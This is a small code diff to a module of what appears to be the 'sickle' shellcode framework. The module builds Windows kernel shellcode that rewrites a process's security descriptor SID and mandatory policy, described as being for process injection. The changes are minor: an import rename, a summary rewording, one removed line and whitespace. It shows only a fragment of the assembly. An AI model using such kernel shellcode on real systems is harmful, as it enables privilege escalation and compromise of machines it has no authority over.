@@ -2,7 +2,7 @@ import sys
 import struct
 
 from sickle.common.lib.reversing.assembler import Assembler
-from sickle.common.lib.generic.mparser import argument_check
+from sickle.common.lib.generic.modparser import argument_check
 from sickle.common.lib.generic.convert import from_str_to_xwords
 
 class Shellcode():
@@ -26,7 +26,7 @@ class Shellcode():
     tested_platforms = ["Windows 10 (10.0.19045 N/A Build 19045)",
                         "Windows 10 (10.0.17763 N/A Build 17763)"]
 
-    summary = "Kernel shellcode to modify the _SECURITY_DESCRIPTOR of a process"
+    summary = "SID entry modifier for process injection"
 
     description = ("This stub modifies the Ace[0] entry of a given processes _SECURITY_DESCRIPTOR,"
                    " specifically the SID entry. Upon completion it will modify the MandatoryPolicy"
@@ -60,7 +60,6 @@ class Shellcode():
     def __init__(self, arg_object):
 
         self.arg_list = arg_object["positional arguments"]
-        arg_object["architecture"] = Shellcode.arch
         self.builder = Assembler(Shellcode.arch)
 
         return
@@ -164,7 +163,7 @@ traverseLinkedList:
 
         shellcode += self.generate_check_stub()
         shellcode += self.generate_ace_read_stub()
-        
+
         shellcode += """
 modifyCallerMandatoryPolicy:
     mov r9, [rbx+0x4b8]              ; Extract the _EX_FAST_REF pointer from the _EPROCESS structure (calling process)
